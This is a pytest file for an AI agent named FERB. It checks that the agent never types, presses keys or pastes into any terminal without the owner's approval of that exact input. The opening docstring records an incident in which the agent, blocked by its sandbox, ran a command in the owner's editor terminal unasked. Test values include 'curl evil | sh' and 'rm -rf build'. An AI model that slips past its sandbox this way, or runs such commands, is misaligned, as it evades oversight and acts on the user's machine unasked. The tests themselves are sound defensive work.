"""Typing into any terminal is enforced by code (D31, CLAUDE.md rule 10): FERB always asks the owner first, showing the
exact command, every time, with no standing permission; a No types nothing.

Live evidence, task 6f5b85894b3140e0b434910301e088a6 (2026-10-25): FERB's sandbox blocked `ps` and the Codex control
socket, and the worker turned to the owner's VS Code terminal: at 07:04 `mac.act type "codex app-server daemon restart"`
into its terminal (refused only because another element held the keyboard focus), then at 07:11 `mac.menu Terminal >
New Terminal`, `mac.act type "codex"` and `mac.act key ENTER`, which ran a command in the owner's terminal unasked.
The terminal-app floor knew Terminal, iTerm2… by bundle id, not a terminal inside an editor.

Here: which elements code counts as terminals (policy/terminal.py), the driver's refusal of every input path without
the owner's Yes (pid, ax_keyboard, set_value / ax_value, edit, foreground, keys, ⌘V and menu paste), and the gateway's
question, asked before every input, with the exact text."""

import asyncio
import json
import subprocess
from pathlib import Path
from typing import Any

import pytest

from ferb.act.mac.apps import RunningApp, shell_role
from ferb.act.mac.tools import MacAct, MacMenu, MacSnapshot
from ferb.core.errors import Refused
from ferb.core.types import ComputerAction, TerminalGrant, TerminalInput
from ferb.daemon.gateway import CONFIRM_ASK, NO, YES
from ferb.policy import confirm, terminal
from ferb.policy.protection import DEFAULT_TERMINAL_APPS
from tests.browserkit import bd, call  # noqa: F401  (the fixture and its helper)
from tests.chromelab import SHOP, _node, _ready
from tests.conftest import RunningDaemon, gateway_request, gateway_setup, gateway_tool_call
from tests.support.terminal_ax import (CLAUDE_TERMINAL, CODE, EDITOR, JETBRAINS_EDITOR, JETBRAINS_TERMINAL,
                                       NOVA_TERMINAL, PAGE_SHELL_BOX, PAGE_XTERM, PYCHARM, TERMINAL, TERMINAL_LABEL,
                                       XCODE_CONSOLE, TerminalApps, TerminalAx, terminal_mac, vscode_ax)

UNASKED = "FERB types into a terminal only after the owner's Yes to that exact input"


# ---------- what counts as a terminal: code, from structural facts (rule 5) ----------

@pytest.mark.parametrize("bundle", [
    "com.apple.Terminal", "com.googlecode.iterm2", "dev.warp.Warp-Stable", "com.mitchellh.ghostty", "org.alacritty",
    "net.kovidgoyal.kitty", "com.github.wez.wezterm", "co.zeit.hyper", "org.tabby", "com.termius-dmg.mac",
    "com.raphaelamorim.rio", "org.contourterminal.contour"])
def test_terminal_apps_are_terminals_by_bundle_id_whatever_the_element(bundle: str) -> None:
    assert bundle in DEFAULT_TERMINAL_APPS
    assert terminal.surface(bundle, []) == f"a terminal app ({bundle})"
    assert terminal.surface(bundle.upper(), EDITOR) is not None                    # any case, any element


def test_the_owners_terminal_apps_and_an_app_that_declares_the_shell_role_count_too() -> None:
    assert terminal.surface("com.example.Term", [], owner_apps=["com.example.term"]) is not None
    assert terminal.surface("com.example.Term", []) is None
    assert "Info.plist" in (terminal.surface("com.example.Shelly", [], shell_app=True) or "")
    # Terminal.app's Info.plist (this Mac, 2026-10-25) declares the Shell role; VS Code's declares Editor for scripts
    terminal_app = {"CFBundleDocumentTypes": [
        {"CFBundleTypeRole": "Shell", "CFBundleTypeName": "Terminal shell script",
         "LSItemContentTypes": ["com.apple.terminal.shell-script"]},
        {"CFBundleTypeRole": "Shell", "LSItemContentTypes": ["public.unix-executable"]}]}
    vscode = {"CFBundleDocumentTypes": [{"CFBundleTypeRole": "Editor", "CFBundleTypeName": "Shell script",
                                         "CFBundleTypeExtensions": ["sh", "zsh"]}]}
    assert shell_role(terminal_app) and not shell_role(vscode) and not shell_role({}) and not shell_role(None)


def test_vscodes_terminal_is_a_terminal_by_xtermjs_dom_classes_and_its_editor_is_not() -> None:
    assert terminal.surface(CODE, TERMINAL) == "a terminal in the page (xterm.js: DOM class xterm-helper-textarea)"
    assert terminal.surface(CODE, TERMINAL[1:]) == "a terminal in the page (xterm.js: DOM class xterm)"
    assert terminal.surface(CODE, EDITOR) is None
    # Cursor and Windsurf are VS Code builds: the same xterm.js facts, whatever the bundle id
    assert terminal.surface("com.todesktop.230313mzl4w4u92", TERMINAL) is not None
    assert terminal.surface("com.exafunction.windsurf", CLAUDE_TERMINAL) is not None


def test_in_web_content_only_a_terminal_librarys_classes_decide_never_the_pages_words() -> None:
    assert terminal.surface("com.google.Chrome", PAGE_XTERM) is not None           # a cloud shell in a page
    assert terminal.surface("com.google.Chrome", PAGE_SHELL_BOX) is None           # a box labelled "Shell command"


def test_native_terminals_by_identifier_kind_or_label_and_a_label_errs_toward_asking() -> None:
    assert "Terminal Tool Window" in (terminal.surface(PYCHARM, JETBRAINS_TERMINAL) or "")
    assert "a label only" in (terminal.surface(PYCHARM, JETBRAINS_TERMINAL) or "")
    assert terminal.surface(PYCHARM, JETBRAINS_EDITOR) is None                     # a window title is never read
    assert terminal.surface("com.apple.dt.Xcode", XCODE_CONSOLE) is not None       # the debugger's console
    assert terminal.surface("com.panic.Nova", NOVA_TERMINAL) is not None
    assert terminal.surface("com.example.ide", [{"role": "AXTextArea", "identifier": "TerminalView"}]) is not None
    assert terminal.surface("com.example.ide", [{"role": "AXTextArea", "role_description": "shell"}]) is not None
    assert terminal.surface("com.example.ide", [{"role": "AXTextArea", "identifier": "EditorView"}]) is None
    assert terminal.surface("com.example.ide", [{"role": "AXTextArea", "description": "Terminally online"}]) is None


def test_an_app_whose_terminal_panel_exposes_no_facts_asks_for_any_typing() -> None:
    assert "Zed" in (terminal.surface("dev.zed.Zed", []) or "")
    assert terminal.surface("com.apple.TextEdit", []) is None


# ---------- the driver: nothing reaches a terminal without the owner's Yes to exactly it ----------

def _ids(d: Any, app: str = "Code") -> dict[str, str]:
    _, out = asyncio.run(d.snapshot(app))
    return {e["label"]: e["id"] for e in out["elements"]}


def _act(d: Any, kind: str, element: str | None = None, text: str | None = None, mechanism: str | None = None,
         grant: TerminalGrant | None = None, task: str = "t1", **kw: Any) -> Any:
    action = ComputerAction(kind, element, text, mechanism=mechanism, **kw)  # type: ignore[arg-type]
    return asyncio.run(d.act("Code", action, "w1", task, **({"terminal": grant} if grant else {})))


def _grant(inp: TerminalInput | None, cid: str = "c1") -> TerminalGrant:
    assert inp is not None
    return TerminalGrant(inp, cid)


@pytest.mark.parametrize("kind,mechanism,extra", [
    ("type", "pid", {}), ("type", "ax_keyboard", {}), ("set_value", "ax", {}), ("set_value", "ax_value", {}),
    ("edit", "ax", {}), ("type", "foreground", {"allow_foreground": True})])
def test_text_into_a_terminal_without_the_owners_yes_is_refused_on_every_mechanism(monkeypatch: Any, kind: str,
                                                                                    mechanism: str, extra: Any) -> None:
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax)
    ids = _ids(d)
    with pytest.raises(Refused) as e:
        _act(d, kind, ids[TERMINAL_LABEL], "codex", mechanism, **extra)
    assert UNASKED in str(e.value) and "shell tool" in str(e.value) and "escape hatch" in str(e.value)
    assert ax.landed == []                                                        # nothing typed


@pytest.mark.parametrize("combo,mechanism", [("ENTER", "pid"), ("return", "ax_keyboard"), ("ctrl+c", "pid"),
                                             ("cmd+v", "ax"), ("cmd+v", "pid"), ("up", "foreground")])
def test_keys_into_a_focused_terminal_without_the_owners_yes_are_refused(monkeypatch: Any, combo: str,
                                                                         mechanism: str) -> None:
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax)
    with pytest.raises(Refused, match=UNASKED):
        _act(d, "key", text=combo, mechanism=mechanism, allow_foreground=True)
    assert ax.landed == []


def test_pasting_by_menu_or_context_menu_into_a_focused_terminal_is_refused_unasked(monkeypatch: Any) -> None:
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax)
    with pytest.raises(Refused, match=UNASKED):
        asyncio.run(d.press_menu("Code", ["Edit", "Paste"]))
    with pytest.raises(Refused, match=UNASKED):
        _act(d, "press", _ids(d)["Paste"], mechanism="ax")
    assert ax.landed == [] and ax.menus_pressed == []
    asyncio.run(d.press_menu("Code", ["View", "Explorer"]))                       # an ordinary menu: nothing asked
    assert ax.menus_pressed == ["View > Explorer"]


def test_typing_that_lands_in_a_terminal_through_a_container_is_refused(monkeypatch: Any) -> None:
    """The element named is the terminal's host group; focusing it puts the keyboard focus in the terminal's input:
    the keystrokes' real destination is checked, not only the element named."""
    ax = vscode_ax(focus="editor")
    d = terminal_mac(monkeypatch, ax)
    with pytest.raises(Refused, match=UNASKED):
        _act(d, "type", _ids(d)["terminal host"], "codex", "pid")
    assert ax.landed == []


def test_the_editor_and_a_click_into_the_terminal_need_no_yes(monkeypatch: Any) -> None:
    ax = vscode_ax(focus="term57")
    d = terminal_mac(monkeypatch, ax)
    ids = _ids(d)
    assert d.terminal_input("Code", ComputerAction("type", ids["Editor content"], "print(1)")) is None
    assert _act(d, "type", ids["Editor content"], "print(1)", "pid").ok
    assert _act(d, "press", ids[TERMINAL_LABEL], mechanism="ax").ok              # a press is a click: allowed
    assert _act(d, "focus", ids[TERMINAL_LABEL]).ok
    assert ("editor", "type print(1)") in ax.landed


def test_the_yes_delivers_exactly_that_text_once_and_its_one_return(monkeypatch: Any) -> None:
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax)
    box = _ids(d)[TERMINAL_LABEL]
    inp = d.terminal_input("Code", ComputerAction("type", box, "codex", mechanism="pid"), "t1")
    assert inp is not None and inp.text == "codex" and inp.enter and "xterm" in inp.surface
    with pytest.raises(Refused, match=UNASKED):                                   # another text: not this Yes
        _act(d, "type", box, "codex --yolo", "pid", grant=_grant(inp))
    assert _act(d, "type", box, "codex", "pid", grant=_grant(inp)).ok
    ret = d.terminal_input("Code", ComputerAction("key", None, "ENTER"), "t1")
    assert ret is not None and ret.covered_by == "c1"                             # covered by the Yes to "codex"
    assert d.terminal_input("Code", ComputerAction("key", None, "ENTER"), "other-task") is not None
    assert d.terminal_input("Code", ComputerAction("key", None, "ENTER"), "other-task").covered_by is None
    assert _act(d, "key", text="ENTER", mechanism="pid", grant=_grant(ret)).ok
    assert ax.landed == [("term108", "type codex"), ("term108", "key ENTER")]
    again = d.terminal_input("Code", ComputerAction("key", None, "ENTER"), "t1")
    assert again is not None and again.covered_by is None                          # one Return only
    with pytest.raises(Refused, match=UNASKED):
        _act(d, "key", text="ENTER", mechanism="pid", grant=_grant(ret))          # its grant is spent
    assert len(ax.landed) == 2


def test_the_covered_return_goes_only_to_the_terminal_the_text_went_into(monkeypatch: Any) -> None:
    """The owner's Claude terminal (57) holds their half-typed words: a Return FERB's Yes covered for terminal 108
    must not submit them when the focus moved there meanwhile."""
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax)
    box = _ids(d)[TERMINAL_LABEL]
    inp = d.terminal_input("Code", ComputerAction("type", box, "codex"), "t1")
    assert _act(d, "type", box, "codex", "pid", grant=_grant(inp)).ok
    ret = d.terminal_input("Code", ComputerAction("key", None, "return"), "t1")
    ax.focused = "term57"                                                         # the owner clicked their terminal
    with pytest.raises(Refused, match=UNASKED):
        _act(d, "key", text="return", mechanism="pid", grant=_grant(ret))
    assert ax.landed == [("term108", "type codex")]


def test_text_that_holds_its_own_return_covers_no_second_one(monkeypatch: Any) -> None:
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax)
    box = _ids(d)[TERMINAL_LABEL]
    inp = d.terminal_input("Code", ComputerAction("type", box, "ls\n"), "t1")
    assert inp is not None and not inp.enter
    assert _act(d, "type", box, "ls\n", "pid", grant=_grant(inp)).ok
    assert d.terminal_input("Code", ComputerAction("key", None, "return"), "t1").covered_by is None


def test_a_paste_is_asked_with_the_clipboards_text_and_a_new_copy_voids_the_yes(monkeypatch: Any) -> None:
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax, clipboard=(7, "rm -rf build", False))
    inp = d.terminal_input("Code", ComputerAction("key", None, "cmd+v"), "t1")
    assert inp is not None and inp.paste and inp.text == "rm -rf build" and inp.clipboard == 7
    assert d.menu_terminal_input("Code", ["Edit", "Paste"]) == inp
    d.board[0] = (8, "something else", False)                                     # copied anew after the question
    with pytest.raises(Refused, match=UNASKED):
        _act(d, "key", text="cmd+v", mechanism="pid", grant=_grant(inp))
    d.board[0] = (7, "rm -rf build", False)
    assert asyncio.run(d.press_menu("Code", ["Edit", "Paste"], terminal=_grant(inp), task="t1"))
    assert ax.landed == [("term108", "paste")]
    secret = terminal_mac(monkeypatch, vscode_ax(focus="term108"), clipboard=(9, None, True))
    hidden = secret.terminal_input("Code", ComputerAction("key", None, "cmd+v"), "t1")
    assert hidden is not None and hidden.concealed and hidden.text is None       # a password manager's item: unshown


def test_a_jetbrains_terminal_and_a_terminal_app_ask_and_their_editors_do_not(monkeypatch: Any) -> None:
    ax = TerminalAx({"term": JETBRAINS_TERMINAL, "editor": JETBRAINS_EDITOR}, focused="term",
                    labels={"term": "Local", "editor": "Editor for main.py"})
    apps = TerminalApps(RunningApp(PYCHARM, "PyCharm", 501, False), RunningApp("com.apple.Terminal", "Terminal", 502,
                                                                             False))
    d = terminal_mac(monkeypatch, ax, apps)
    _, out = asyncio.run(d.snapshot("PyCharm"))
    ids = {e["label"]: e["id"] for e in out["elements"]}
    assert d.terminal_input("PyCharm", ComputerAction("type", ids["Local"], "ls")) is not None
    assert d.terminal_input("PyCharm", ComputerAction("type", ids["Editor for main.py"], "ls")) is None
    with pytest.raises(Refused, match=UNASKED):
        asyncio.run(d.act("PyCharm", ComputerAction("type", ids["Local"], "ls", mechanism="pid"), "w1", "t1"))
    assert d.terminal_input("Terminal", ComputerAction("key", None, "return")) is not None   # focus unknown: the app


# ---------- the gateway: FERB asks before every input, with the exact command ----------

class Owner:
    """Answers FERB's questions in order (True: Yes, False: No) and keeps each question's text and summary."""

    def __init__(self, d: RunningDaemon, answers: list[bool]) -> None:
        self.d, self.answers, self.asked, self.summaries = d, list(answers), [], []
        self._task = asyncio.run_coroutine_threadsafe(self._loop(), d.loop)

    async def _loop(self) -> None:
        approvals = self.d.daemon.state.approvals
        while True:
            for ap in approvals.pending():
                if ap.capability != CONFIRM_ASK or not self.answers:
                    continue
                yes = self.answers.pop(0)
                approvals.resolve(ap.id, True, ap.options.index(YES if yes else NO) + 1)
                self.asked.append(ap.reason)
                self.summaries.append(ap.summary)
            await asyncio.sleep(0.02)

    def stop(self) -> None:
        self._task.cancel()


def _live(d: RunningDaemon, monkeypatch: Any, focus: str = "term57") -> tuple[Any, TerminalAx]:
    """The real mac.snapshot / mac.menu / mac.act over VS Code as the 07:11 trace saw it: the owner's Claude terminal
    holds the keyboard focus until FERB opens a new terminal."""
    ax = vscode_ax(focus=focus)
    driver = terminal_mac(monkeypatch, ax)
    grant, _ = gateway_setup(d, {"mac:read", "mac:act"}, gateway_request("check that plain codex starts"),
                             [MacSnapshot(driver), MacMenu(driver), MacAct(driver)])
    return grant, ax


def _snap(d: RunningDaemon, grant: Any) -> dict[str, str]:
    out = gateway_tool_call(d, grant, "mac.snapshot", app="Code")
    assert not out["is_error"], out
    return {e["label"]: e["id"] for e in out["content"]["elements"]}


def _questions(d: RunningDaemon) -> list[dict[str, Any]]:
    async def go() -> list[dict[str, Any]]:
        rows = d.daemon.db.conn.execute(
            "SELECT input_json, output_json FROM spans WHERE kind = 'tool.call' AND "
            "json_extract(input_json, '$.tool') = 'owner.ask' AND json_extract(input_json, '$.ferb_question') = 1 "
            "ORDER BY rowid").fetchall()
        return [json.loads(r["input_json"])["args"] | {"answer": json.loads(r["output_json"] or "{}").get("answer")}
                for r in rows]
    return d.run(go())                                                            # type: ignore[no-any-return]


def test_the_live_sequence_asks_first_and_a_yes_types_once_and_sends_its_return(daemon: RunningDaemon,
                                                                                monkeypatch: Any) -> None:
    grant, ax = _live(daemon, monkeypatch)
    owner = Owner(daemon, [True, True])
    try:
        menu = gateway_tool_call(daemon, grant, "mac.menu", app="Code", path="Terminal > New Terminal")
        assert not menu["is_error"] and ax.focused == "term108"      # the Terminal menu operates it: asked (round 1)
        assert len(_questions(daemon)) == 1
        typed = gateway_tool_call(daemon, grant, "mac.act", app="Code", element=_snap(daemon, grant)[TERMINAL_LABEL],
                                  action="type", mechanism="pid", text="codex",
                                  why="Enter plain `codex` in the clean FERB terminal for the final startup check.")
        assert not typed["is_error"], typed
        enter = gateway_tool_call(daemon, grant, "mac.act", app="Code", element=_snap(daemon, grant)[TERMINAL_LABEL],
                                  action="key", mechanism="pid", text="ENTER", why="Run plain Codex.")
        assert not enter["is_error"], enter
    finally:
        owner.stop()
    assert ax.landed == [("term108", "type codex"), ("term108", "key ENTER")]     # once each, in FERB's terminal
    asked = _questions(daemon)[1:]                                                # after the menu's question
    assert len(asked) == 1 and asked[0]["confirm"][0]["rule"] == confirm.TERMINAL_INPUT and asked[0]["answer"] == YES
    assert owner.summaries[1:] == ['FERB wants to type "codex" into the terminal "Terminal 108, zsh Use ⌥F1 for…" in '
                                   'Code (window "FERB"), then press Return there (it runs as you, outside FERB\'s '
                                   'sandbox).']
    assert '"codex"' in asked[0]["question"] and "xterm" in asked[0]["question"]
    assert "this Yes covers this one input only" in asked[0]["question"]


def test_a_second_identical_command_asks_again_and_a_no_types_nothing(daemon: RunningDaemon, monkeypatch: Any) -> None:
    grant, ax = _live(daemon, monkeypatch, focus="term108")
    owner = Owner(daemon, [True, False])
    try:
        box = _snap(daemon, grant)[TERMINAL_LABEL]
        assert not gateway_tool_call(daemon, grant, "mac.act", app="Code", element=box, action="type", mechanism="pid",
                                     text="codex")["is_error"]
        box = _snap(daemon, grant)[TERMINAL_LABEL]
        no = gateway_tool_call(daemon, grant, "mac.act", app="Code", element=box, action="type", mechanism="pid",
                               text="codex", why="once more")
    finally:
        owner.stop()
    assert [q["answer"] for q in _questions(daemon)] == [YES, NO]                  # asked again, the same text
    assert no["is_error"] and "the owner said no" in no["content"]["error"]
    assert no["content"]["next"].startswith("The owner decided")
    assert ax.landed == [("term108", "type codex")]                               # the No typed nothing
    box = _snap(daemon, grant)[TERMINAL_LABEL]
    again = gateway_tool_call(daemon, grant, "mac.act", app="Code", element=box, action="type", mechanism="pid",
                              text="codex")
    assert again["is_error"] and "already said no" in again["content"]["error"]    # the No stands for it
    assert len(_questions(daemon)) == 2 and ax.landed == [("term108", "type codex")]


def test_a_retry_asks_again(daemon: RunningDaemon, monkeypatch: Any) -> None:
    """The owner said Yes, but the keyboard focus was elsewhere, so nothing was typed; the worker's retry of the very
    same call is asked again: a Yes covers one input, never a later attempt."""
    grant, ax = _live(daemon, monkeypatch, focus="term108")
    ax.keeps_focus = False
    ax.focused = "editor"
    owner = Owner(daemon, [True, True])
    try:
        box = _snap(daemon, grant)[TERMINAL_LABEL]
        first = gateway_tool_call(daemon, grant, "mac.act", app="Code", element=box, action="type", mechanism="pid",
                                  text="codex app-server daemon restart")
        assert first["is_error"] and "keyboard focus" in first["content"]["error"]
        ax.keeps_focus = True
        retry = gateway_tool_call(daemon, grant, "mac.act", app="Code", element=box, action="type", mechanism="pid",
                                  text="codex app-server daemon restart")
        assert not retry["is_error"], retry
    finally:
        owner.stop()
    assert [q["answer"] for q in _questions(daemon)] == [YES, YES]
    assert ax.landed == [("term108", "type codex app-server daemon restart")]


def test_a_return_ferb_did_not_type_for_asks_and_says_what_it_runs(daemon: RunningDaemon, monkeypatch: Any) -> None:
    grant, ax = _live(daemon, monkeypatch, focus="term57")
    owner = Owner(daemon, [False])
    try:
        out = gateway_tool_call(daemon, grant, "mac.act", app="Code", action="key", mechanism="pid", text="return")
    finally:
        owner.stop()
    assert out["is_error"] and ax.landed == []
    assert owner.summaries == ['FERB wants to press Return in the terminal "Terminal 57, claude Use ⌥F1 f…" in Code '
                               '(window "FERB") (it runs what is on its command line, which FERB didn\'t type there).']


def test_the_editor_needs_no_question(daemon: RunningDaemon, monkeypatch: Any) -> None:
    grant, ax = _live(daemon, monkeypatch, focus="editor")
    out = gateway_tool_call(daemon, grant, "mac.act", app="Code", element=_snap(daemon, grant)["Editor content"],
                            action="type", mechanism="pid", text="print('hi')")
    assert not out["is_error"], out
    assert _questions(daemon) == [] and ax.landed == [("editor", "type print('hi')")]


def test_a_menu_paste_into_the_focused_terminal_asks_with_the_clipboards_text(daemon: RunningDaemon,
                                                                              monkeypatch: Any) -> None:
    grant, ax = _live(daemon, monkeypatch, focus="term108")
    owner = Owner(daemon, [True])
    try:
        out = gateway_tool_call(daemon, grant, "mac.menu", app="Code", path="Edit > Paste")
    finally:
        owner.stop()
    assert not out["is_error"], out
    assert owner.summaries == ["FERB wants to paste the clipboard's text \"codex\" into the terminal \"Terminal 108, "
                               "zsh Use ⌥F1 for…\" in Code (window \"FERB\"), then press Return there (it runs as you, "
                               "outside FERB's sandbox)."]
    assert ax.landed == [("term108", "paste")]


# ---------- a web terminal in a browser page (xterm.js): browser.act asks the same way ----------


def test_typing_into_a_web_terminal_asks_and_a_yes_covers_its_return(bd: Any) -> None:
    d, launched = bd
    ext, g = _ready(d, launched)
    tab = call(d, g, "browser.open", url=f"{SHOP}/terminal")["content"]["tab"]
    snap = call(d, g, "browser.snapshot", tab=tab)["content"]
    term, docs = (next(e["id"] for e in snap["elements"] if e["label"] == label)
                  for label in ("Terminal input", "Search docs"))
    owner = Owner(d, [True, False])
    try:
        assert not call(d, g, "browser.act", tab=tab, element=docs, action="type", text="xterm")["is_error"]
        assert _questions(d) == []                                                # an ordinary box: no question
        typed = call(d, g, "browser.act", tab=tab, element=term, action="type", text="gcloud config list")
        assert not typed["is_error"], typed
        enter = call(d, g, "browser.act", tab=tab, element=term, action="press", text="Enter")
        assert not enter["is_error"], enter                                       # covered by that Yes
        again = call(d, g, "browser.act", tab=tab, element=term, action="press", text="Enter")
    finally:
        owner.stop()
    assert [q["answer"] for q in _questions(d)] == [YES, NO]                      # the second Return asked: No
    assert owner.summaries[0] == ('FERB wants to type "gcloud config list" into the terminal in the page on '
                                  "shop.example, then press Return there (it runs as you, outside FERB's sandbox).")
    assert again["is_error"] and "the owner said no" in again["content"]["error"]
    sent = [(a["kind"], a["text"]) for a in ext.acts]
    assert sent == [("type", "xterm"), ("type", "gcloud config list"), ("press", "Enter")]   # the No sent nothing


def test_the_extension_marks_an_element_inside_xtermjs() -> None:
    """content.js's own describe(): `terminal` for xterm.js's input and anything inside its root, by the classes
    xterm.js sets; never for a page box whose words say terminal."""
    source = Path("extensions/chromium/content.js").read_text()
    fn = source[source.index("  function terminalOf("):source.index("  // Visible text nearest")]
    script = fn + r'''
const el = (classes, inside) => ({classList: {contains: c => classes.includes(c)},
                                  closest: sel => (sel === ".xterm" && inside) ? {} : null});
console.log(JSON.stringify([terminalOf(el(["xterm-helper-textarea"], true)), terminalOf(el([], true)),
                            terminalOf(el(["terminal", "shell"], false)), terminalOf({})]));
'''
    out = subprocess.run([_node(), "-e", script], capture_output=True, text=True, check=True).stdout
    assert json.loads(out) == [True, True, False, False]


def test_scrolling_a_terminals_text_view_sends_it_no_page_keys(monkeypatch: Any) -> None:
    """Page Up / Page Down are keys: in a terminal they go to the program running there, so FERB doesn't send them
    unasked; the wheel (mac.pointer) scrolls it instead."""
    ax = TerminalAx({"term": JETBRAINS_TERMINAL}, focused="term", labels={"term": "Local"})
    ax.scroll_area_of = lambda el: "area"                                          # type: ignore[attr-defined]
    ax.scroll_content = lambda area: "content"                                     # type: ignore[attr-defined]
    ax.scroll_bar = lambda area, vertical: None                                    # type: ignore[attr-defined]
    ax.scroll_position = lambda area, content: (0, 0)                              # type: ignore[attr-defined]
    apps = TerminalApps(RunningApp(PYCHARM, "PyCharm", 501, False))
    d = terminal_mac(monkeypatch, ax, apps)
    _, out = asyncio.run(d.snapshot("PyCharm"))
    r = asyncio.run(d.act("PyCharm", ComputerAction("scroll", out["elements"][0]["id"], direction="down",
                                                    mechanism="pid"), "w1", "t1"))
    assert not r.ok and "no Page keys" in r.detail and ax.landed == []


# ---------- review round 1 (2026-10-25), finding 5: what the owner sees is exactly what goes in ----------

def test_the_question_writes_every_invisible_character_as_a_visible_escape() -> None:
    """DEL, C0/C1 controls, line and paragraph separators, zero-width, bidi and other format characters, and non-ASCII
    spaces are written as \\uXXXX: the probe showed "abc\\x7f" displayed as "abc" (printable() dropped it)."""
    text = "abc\x7f\x85\u2028\u200b\u202e\xa0\ufeffz \t\n\x1b"
    shown = terminal.need(TerminalInput("Code", CODE, "a terminal", text=text)).values["text"]
    assert shown == ('"abc\\u007f\\u0085\\u2028\\u200b\\u202e\\u00a0\\ufeffz \\t\\n\\u001b"')
    assert shown.isprintable()
    need = terminal.need(TerminalInput("Code", CODE, "a\u202eterminal", text="x"))
    assert all(c.isprintable() for v in need.values.values() for c in v)


def test_text_holding_a_saved_secret_is_never_typed_into_a_terminal(daemon: RunningDaemon, monkeypatch: Any) -> None:
    """Redaction would show it as [redacted] while the real secret is typed: FERB refuses before asking. A saved
    secret goes in only through the sealed path (mac.secret, the owner's hidden input)."""
    grant, ax = _live(daemon, monkeypatch, focus="term108")
    daemon.daemon._add_secret_value("Hunter2-Sealed!")
    out = gateway_tool_call(daemon, grant, "mac.act", app="Code", element=_snap(daemon, grant)[TERMINAL_LABEL],
                            action="type", mechanism="pid", text="sudo -S <<< Hunter2-Sealed!")
    assert out["is_error"] and "saved secret" in out["content"]["error"] and "mac.secret" in out["content"]["error"]
    assert _questions(daemon) == [] and ax.landed == []


def test_a_paste_whose_clipboard_holds_a_secret_says_so_at_that_spot(daemon: RunningDaemon, monkeypatch: Any) -> None:
    grant, ax = _live(daemon, monkeypatch, focus="term108")
    daemon.daemon._add_secret_value("Hunter2-Sealed!")
    driver = daemon.daemon.registry.capabilities["mac.act"].driver
    driver.board[0] = (11, "export TOKEN=Hunter2-Sealed!", False)
    owner = Owner(daemon, [False])
    try:
        gateway_tool_call(daemon, grant, "mac.act", app="Code", action="key", mechanism="pid", text="cmd+v")
    finally:
        owner.stop()
    assert owner.summaries == ["FERB wants to paste the clipboard's text \"export TOKEN=[redacted]\" (it contains a "
                               "saved secret where it shows [redacted]) into the terminal \"Terminal 108, zsh Use ⌥F1 "
                               "for…\" in Code (window \"FERB\"), then press Return there (it runs as you, outside "
                               "FERB's sandbox)."]
    assert ax.landed == []


# ---------- review round 1, finding 3: the covered Return is only the task's very next action ----------

@pytest.mark.parametrize("between", [
    dict(tool="mac.act", action="press", element="Editor content", mechanism="ax"),      # an AX press
    dict(tool="mac.act", action="focus", element="Editor content"),                      # a focus change
    dict(tool="mac.menu", path="View > Explorer"),                                       # a menu press
])
def test_any_other_action_between_the_text_and_its_return_makes_the_return_ask(daemon: RunningDaemon,
                                                                               monkeypatch: Any,
                                                                               between: dict[str, Any]) -> None:
    """Any acting call of the task between the approved text and its Return (a press, a focus change, a menu, a
    pointer input) cancels the covered Return: it could change what the Return runs. A look (a snapshot) doesn't."""
    grant, ax = _live(daemon, monkeypatch, focus="term108")
    owner = Owner(daemon, [True, False])
    try:
        assert not gateway_tool_call(daemon, grant, "mac.act", app="Code", element=_snap(daemon, grant)[TERMINAL_LABEL],
                                     action="type", mechanism="pid", text="codex")["is_error"]
        args = dict(between)
        tool = args.pop("tool")
        if "element" in args:
            args["element"] = _snap(daemon, grant)[args["element"]]
        gateway_tool_call(daemon, grant, tool, app="Code", **args)
        ax.focused = "term108"                                                    # the terminal has the focus again
        enter = gateway_tool_call(daemon, grant, "mac.act", app="Code", action="key", mechanism="pid", text="ENTER")
    finally:
        owner.stop()
    assert [q["answer"] for q in _questions(daemon)] == [YES, NO]                  # the Return was asked: No
    assert enter["is_error"] and ("term108", "key ENTER") not in ax.landed


# ---------- review round 1, finding 11: which terminal, and the focus held while typing ----------

def test_the_question_names_the_terminal_and_its_window(monkeypatch: Any) -> None:
    """The owner's Claude terminal (57) and FERB's new one (108) are both "the terminal in Code": the question names
    the terminal's own label and its window's title."""
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax)
    inp = d.terminal_input("Code", ComputerAction("type", _ids(d)[TERMINAL_LABEL], "codex"), "t1")
    assert inp is not None and inp.window == "FERB" and inp.label == TERMINAL_LABEL
    assert confirm.summary([terminal.need(inp)]) == (
        'FERB wants to type "codex" into the terminal "Terminal 108, zsh Use ⌥F1 for…" in Code (window "FERB"), then '
        "press Return there (it runs as you, outside FERB's sandbox).")


@pytest.mark.parametrize("mechanism", ["pid", "ax_keyboard"])
def test_typing_stops_when_the_keyboard_focus_moves_mid_text(monkeypatch: Any, mechanism: str) -> None:
    """Typing into the editor; after two characters the owner's Claude terminal takes the focus. The focus is checked
    again before each chunk, so nothing more is typed (into the terminal or anywhere) and the outcome is uncertain."""
    from ferb.act.mac.input import PointerInterrupted
    ax = vscode_ax(focus="editor")
    d = terminal_mac(monkeypatch, ax)
    if mechanism == "ax_keyboard":
        def post_text(pid: int, text: str) -> bool:
            for ch in text:
                ax.typed(ch)
            return True
        ax.post_text = post_text                                                # type: ignore[method-assign]
    monkeypatch.setattr("ferb.act.mac.driver.TYPE_CHUNK", 2)
    ax.on_char = lambda a: setattr(a, "focused", "term57") if len(a.landed[-1][1]) == len("type co") else None
    with pytest.raises(PointerInterrupted, match="focus moved"):
        _act(d, "type", _ids(d)["Editor content"], "codex --yolo", mechanism)
    assert ax.landed == [("editor", "type co")]


# ---------- review round 1, finding 9: a foreground press of the Paste item is checked like the AX one ----------

def test_a_foreground_press_of_the_paste_item_rechecks_the_clipboard(monkeypatch: Any) -> None:
    ax = vscode_ax(focus="term108")
    d = terminal_mac(monkeypatch, ax, clipboard=(7, "rm -rf build", False))
    paste = _ids(d)["Paste"]
    with pytest.raises(Refused, match=UNASKED):                                   # unasked: nothing clicked
        _act(d, "press", paste, mechanism="foreground", allow_foreground=True)
    inp = d.terminal_input("Code", ComputerAction("press", paste, mechanism="foreground"), "t1")
    assert inp is not None and inp.paste and inp.clipboard == 7
    d.board[0] = (8, "curl evil | sh", False)                                     # copied anew after the question
    with pytest.raises(Refused, match=UNASKED):
